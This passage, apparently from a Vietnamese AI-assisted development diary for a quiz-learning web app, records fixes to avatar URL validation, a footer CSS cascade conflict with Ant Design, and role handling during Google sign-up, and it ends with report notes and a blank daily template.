cao hơn) khiến chuyện đó là **bình thường chứ không phải ngoại lệ**. Nên `count(distinct user_id)`, và bài
`IN_PROGRESS` không tính: mở đề ra xem rồi thoát không phải là đã học.

Dùng `@Formula` thay vì cột đếm sẵn: cột đếm sẵn phải được cập nhật ở mọi đường ghi (nộp bài, phòng đấu, xoá
tài khoản) và **sai lệch dần** khi quên một đường; `@Formula` không bao giờ lệch vì nó không lưu gì.

### Ảnh đại diện: một ô nhập không kiểm tra, và nó nằm trên màn hình người khác

Làm trang sửa hồ sơ mới nhìn ra: `avatarUrl` nhận **bất kỳ chuỗi nào**. Nghe như chuyện riêng của mỗi người —
nhưng ảnh đại diện được render trên **màn hình người khác**: thanh điều hướng, bảng xếp hạng, danh sách lớp,
thẻ người chơi trong phòng đấu. Dán một URL ngoài vào đó là đặt một **pixel theo dõi**: máy chủ lạ nhận được
IP của mọi người vừa mở bảng xếp hạng.

Nhưng chặn thẳng "chỉ nhận `/uploads/`" thì **hỏng đăng nhập Google**: ảnh của họ nằm ở `googleusercontent.com`,
và người dùng chỉ cần bấm Lưu một lần ở trang hồ sơ là mất ảnh. Luật đúng là: **không đổi thì luôn cho phép,
đổi thì phải là ảnh đã tải lên hệ thống**.

`UploadedImagePath` (tách ra hôm chiều cho ảnh bìa + ảnh câu hỏi) dùng lại ở đây là chỗ thứ **ba**.

### Chân trang: cùng một cái bẫy Ant Design, lần thứ hai

Chân trang **không có** "Về chúng tôi / Điều khoản / Liên hệ" — hệ thống không có trang nào trong số đó, và một
link chết ở chân trang tệ hơn chân trang trống vì nó hứa rồi để người bấm rơi vào 404. 16 link còn lại đều được
soi ngược lại bảng route.

*(Bộ kiểm link đầu tiên của em báo "chết" nhầm cho một loạt link: biểu thức tìm kiếm bắt buộc `<Route path=` nằm
gọn một dòng, trong khi route bọc `<ProtectedRoute>` trải nhiều dòng. Suýt xoá đi những link đúng.)*

**Lỗi người dùng chỉ ra:** ở trang nội dung ngắn, chân trang **trồi lên giữa màn hình**. Chẩn đoán đầu của em
sai — em cho rằng phần nội dung không giãn ra và thêm `flex-1!`. Mở mã nguồn Ant Design ra mới thấy
`.ant-layout-content { flex: auto }` đã có sẵn; thủ phạm là `.ant-layout { min-height: 0 }` **đè chết**
`min-h-screen`.

Đúng cái bẫy đã ghi thành bài học ở `ui-design-system.md §3`: Ant Design chèn CSS lúc chạy **ngoài** `@layer` của
Tailwind, mà theo luật xếp tầng thì **ngoài layer luôn thắng**. Lần trước là `a { color }` nuốt màu link. Lần này
là `min-height`. Sửa đúng một ký tự: `min-h-screen` thành `min-h-screen!`. `flex-1!` em thêm vào bị gỡ bỏ — nó
không làm gì cả.

Bài học: cái bẫy này **không tự nhận diện được từ triệu chứng**. Cả hai lần triệu chứng đều trông như "Tailwind
không có tác dụng", và cả hai lần phản xạ đầu tiên của em là đi tìm nguyên nhân ở chỗ khác.

---

### Đăng ký bằng Google: ô chọn vai trò bị bỏ qua trong im lặng

Người dùng hỏi một câu rất gọn: *"nếu tôi nhấn đăng ký bằng gg, và chọn phần role thì nó có ăn theo không"*.

**Không.** Và cả **ba tầng** đều bỏ rơi lựa chọn đó: frontend không gửi `role`, backend đặt cứng `Role.LEARNER`,
còn giao diện **vẫn hiện ô chọn vai trò đang sáng ngay phía trên nút Google**. Người chọn "Tạo quiz, sinh đề AI"
rồi bấm Google sẽ vào hệ thống với vai trò Người học, không một dòng báo lỗi, và không hiểu vì sao không thấy
mục soạn quiz đâu.

**Lý do cũ trong code không đứng vững.** Chú thích ghi *"cho tự chọn vai trò là mở đường tự phong CREATOR"*.
Nhưng **đăng ký thường vốn đã cho tự chọn CREATOR** — chỉ ADMIN bị hạ. Nên đó không phải một quyết định bảo mật,
mà là một **mâu thuẫn nội bộ**: cùng một người, cùng một lựa chọn, ra hai kết quả khác nhau chỉ vì bấm nút nào.
Ranh giới an ninh thật của dự án là ADMIN (`security.md §1`), và nó không bị đụng tới.

**Ràng buộc trung tâm — vai trò chỉ áp khi TẠO MỚI.** `/auth/google` dùng chung cho **cả đăng nhập lẫn đăng ký**;
Google không phân biệt hai việc đó, và không thể phân biệt được. Nếu áp vai trò ở mọi lần gọi thì bất kỳ ai cũng
tự lên CREATOR bằng cách **đăng nhập lại một lần nữa** — tức là thay vì mở một cửa, nó tháo hẳn cánh cửa. Đường
thứ hai còn kín hơn: một tài khoản LEARNER sẵn có chỉ cần **liên kết Google** là lên CREATOR. Có test riêng cho
từng đường, vì đây mới là phần dễ làm hỏng chứ không phải phần đọc `role` ra.

**Một cái bẫy ở frontend:** vai trò phải nằm trong `ref`. Google Identity Services đăng ký hàm callback **một
lần** lúc `initialize`, nên đọc thẳng biến state sẽ **đóng băng ở giá trị của lần render đầu** — người dùng đổi
lựa chọn rồi bấm Google sẽ gửi vai trò **cũ**. Lỗi đó im lặng hoàn toàn: không cảnh báo, không sai kiểu, chỉ ra
kết quả sai đúng vào tình huống thật.

Trang **đăng nhập** cố ý **không** truyền `role`: backend bỏ qua, nên gửi ở đó chỉ tạo ấn tượng sai rằng đăng
nhập lại có thể đổi vai trò.

### Ghi chú báo cáo

- **Mục 2.3 / 2.4 (đặc tả UC "Đăng nhập bằng Google"):** đây là ví dụ sạch cho phần phân tích — *một endpoint
  phục vụ hai use case khác nhau* (Đăng ký / Đăng nhập) mà bên ngoài không phân biệt được, nên ràng buộc phải
  đặt vào **trạng thái dữ liệu** (tài khoản đã tồn tại hay chưa) chứ không vào lời gọi.
- **"Khó khăn & cách giải quyết":** ba lỗi hôm nay đều thuộc loại **hỏng trong im lặng** — ô chọn vai trò bị bỏ
  qua, ảnh đại diện không kiểm tra, `min-height` bị đè. Không cái nào làm test đỏ, cả ba đều lộ ra khi **mở web
  ra bấm**. Đáng viết thành một đoạn: *bộ test xanh chứng minh những gì đã nghĩ tới là đúng, không chứng minh
  đã nghĩ đủ*.
- **Mục 3.3 (giao diện):** phần từ chối hiện điểm đánh giá dùng được làm ví dụ cho nguyên tắc "không bịa dữ
  liệu" — và nói rõ được **vì sao** ở chỗ này nó nghiêm trọng hơn trang trí: số đánh giá là căn cứ chọn bài học.

---

## 🧩 Mẫu ngày (copy để dùng)

```markdown
## 📅 <Thứ> — <dd/mm/yyyy> — <Tên trọng tâm>

**Mục tiêu hôm nay:** <mô tả ngắn>

### Nhiệm vụ
- [ ] <nhiệm vụ 1>
- [ ] <nhiệm vụ 2>
- [ ] <nhiệm vụ 3>

### Đã làm được
-

### Nợ / chuyển sang ngày sau
-

### Vướng mắc
-

### Ghi chú báo cáo
-
```

> Nhớ thêm 1 dòng vào **Bảng theo dõi nhanh** cho mỗi ngày mới.
